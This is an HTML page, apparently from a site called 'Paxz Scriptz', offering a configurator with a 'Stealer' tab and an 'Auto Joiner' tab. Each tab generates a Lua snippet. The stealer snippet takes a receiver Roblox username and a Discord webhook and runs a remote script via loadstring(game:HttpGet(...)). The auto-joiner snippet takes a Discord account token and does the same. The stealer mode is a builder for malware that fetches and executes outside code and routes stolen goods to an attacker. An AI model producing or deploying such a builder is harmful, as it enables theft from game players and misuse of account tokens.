<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Configurator | Paxz Scriptz</title>
    <style>
        :root { --bg: #050505; --card: #0f0f0f; --accent: #8a2be2; --text: #ffffff; --text-dim: #a0a0a0; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; }
        
        nav { display: flex; justify-content: space-between; padding: 15px 8%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #1a1a1a; }
        .logo { font-size: 22px; font-weight: 800; text-decoration: none; color: white; text-transform: uppercase; }
        .logo span { color: var(--accent); }

        .container { max-width: 700px; margin: 30px auto; padding: 0 20px; }
        .config-wrapper { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #1a1a1a; }
        
        .selector-tabs { display: flex; gap: 8px; margin-bottom: 20px; background: #000; padding: 4px; border-radius: 6px; }
        .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; border-radius: 4px; transition: 0.3s; font-weight: 700; color: var(--text-dim); font-size: 13px; }
        .tab.active { background: var(--accent); color: white; }

        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 12px; font-weight: 600; text-transform: uppercase; }
        input { width: 100%; padding: 12px; background: #000; border: 1px solid #222; border-radius: 6px; color: white; font-size: 14px; transition: 0.3s; box-sizing: border-box; }
        input:focus { border-color: var(--accent); outline: none; }

        .btn-gen { width: 100%; background: var(--accent); color: white; padding: 14px; border-radius: 6px; font-weight: 800; border: none; cursor: pointer; font-size: 15px; text-transform: uppercase; }
        
        #result-section { margin-top: 20px; display: none; }
        .code-box { background: #000; border: 1px solid var(--accent); border-radius: 6px; position: relative; }
        textarea { width: 100%; height: 100px; background: transparent; color: #bbb; padding: 15px; border: none; font-family: 'Consolas', monospace; font-size: 12px; resize: none; outline: none; box-sizing: border-box; }
        .copy-btn { position: absolute; top: 8px; right: 8px; background: #1a1a1a; color: white; border: 1px solid #333; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 10px; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <nav>
        <a href="index.html" class="logo">Paxz<span>Scriptz</span></a>
        <div style="font-size: 12px;"><a href="scripts.html" style="color: var(--text-dim); text-decoration: none;">&larr; BACK</a></div>
    </nav>

    <div class="container">
        <div class="config-wrapper">
            <h3 style="margin-top: 0; margin-bottom: 20px; font-size: 1.2rem;">Configurator</h3>
            
            <div class="selector-tabs">
                <div class="tab active" id="tab-stealer" onclick="switchMode('stealer')">Stealer</div>
                <div class="tab" id="tab-autojoin" onclick="switchMode('autojoin')">Auto Joiner</div>
            </div>

            <div id="inputs-container"></div>

            <button class="btn-gen" onclick="generateCode()">Generate Code</button>

            <div id="result-section">
                <div class="code-box">
                    <button class="copy-btn" onclick="copyToClipboard()">COPY</button>
                    <textarea id="output-code" readonly></textarea>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentMode = 'stealer';
        function switchMode(mode) {
            currentMode = mode;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById(`tab-${mode}`).classList.add('active');
            renderInputs();
            document.getElementById('result-section').style.display = 'none';
        }

        function renderInputs() {
            const container = document.getElementById('inputs-container');
            if (currentMode === 'stealer') {
                container.innerHTML = `
                    <div class="input-group"><label>Receiver Username</label><input type="text" id="val1" placeholder="Roblox Username"></div>
                    <div class="input-group"><label>Webhook URL</label><input type="text" id="val2" placeholder="Discord Webhook Link"></div>`;
            } else {
                container.innerHTML = `
                    <div class="input-group"><label>Discord Token</label><input type="text" id="val1" placeholder="Account Token"></div>
                    <div class="input-group"><label>Channel ID</label><input type="text" id="val2" placeholder="Target Channel ID"></div>`;
            }
        }

        function generateCode() {
            const v1 = document.getElementById('val1').value;
            const v2 = document.getElementById('val2').value;
            let code = currentMode === 'stealer' 
                ? `_G.username = "${v1}"\n_G.webhook = "${v2}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/deltamokey-arch/PaxzScriptz/refs/heads/main/Main'))()`
                : `_G.DISCORD_TOKEN = "${v1}"\n_G.CHANNEL_ID = "${v2}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/deltamokey-arch/PaxzScriptz/refs/heads/main/AutoJoiner.lua'))()`;
            document.getElementById('output-code').value = code;
            document.getElementById('result-section').style.display = 'block';
        }

        function copyToClipboard() {
            const c = document.getElementById("output-code"); c.select(); document.execCommand("copy"); alert("Copied!");
        }

        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.get('type') === 'autojoin') switchMode('autojoin'); else renderInputs();
    </script>
</body>
</html>
